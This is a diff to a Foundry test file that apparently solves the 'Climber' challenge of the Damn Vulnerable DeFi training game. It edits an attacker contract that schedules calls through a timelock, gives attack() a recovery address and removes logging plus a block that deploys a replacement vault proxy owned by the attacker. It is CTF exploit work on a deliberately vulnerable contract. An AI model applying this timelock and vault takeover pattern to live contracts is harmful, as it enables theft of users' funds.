@@ -32,7 +32,7 @@ contract ClimberAttacker is Test{
         token = _token;
     }
    
-   function attack() external{
+   function attack(address recovery) external{
 
          _targets = new address[](4);
         _values = new uint256[](4);
@@ -69,21 +69,6 @@ contract ClimberAttacker is Test{
         timelock.schedule(_targets, _values, _dataElements, _salt);
 
         console.log(address(this));
-        console.log(vault.getSweeper());
-        console.log(token.balanceOf(address(vault)));
-
-        vault = ClimberVault(
-            address(
-                new ERC1967Proxy(
-                    address(new ClimberVault()), // implementation
-                    abi.encodeCall(ClimberVault.initialize, (address(this), address(this), address(this))) // initialization data
-                )
-            )
-        );
-
-        console.log(address(this));
-        console.log(vault.getSweeper());
-        console.log(token.balanceOf(address(vault)));
 
 
 
@@ -171,7 +156,7 @@ contract ClimberChallenge is Test {
      */
     function test_climber() public checkSolvedByPlayer {
         ClimberAttacker attacker = new ClimberAttacker(ClimberVault(vault),ClimberTimelock(timelock),DamnValuableToken(token));
-        attacker.attack();
+        attacker.attack(address(recovery));
 
         
 
